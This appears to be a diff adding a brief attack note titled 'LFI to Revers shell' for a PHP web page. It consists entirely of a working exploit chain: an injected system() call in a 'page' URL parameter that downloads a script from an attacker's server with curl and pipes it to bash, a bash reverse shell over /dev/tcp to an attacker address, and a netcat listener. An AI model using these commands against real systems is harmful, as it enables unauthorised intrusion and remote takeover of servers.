@@ -1,1 +1,9 @@
+# LFI to Revers shell:
 
+http://192.192.1.1/index.php?page=' and die(system("curl http://attacker_ip_simple_http_server/revreshell.sh | bash")) or '
+
+cat revreshell.sh
+#!/bin/bash
+bash -i >& /dev/tcp/attacker_ip_local_ip/1234 0>&1
+
+nc -lvnp 1234
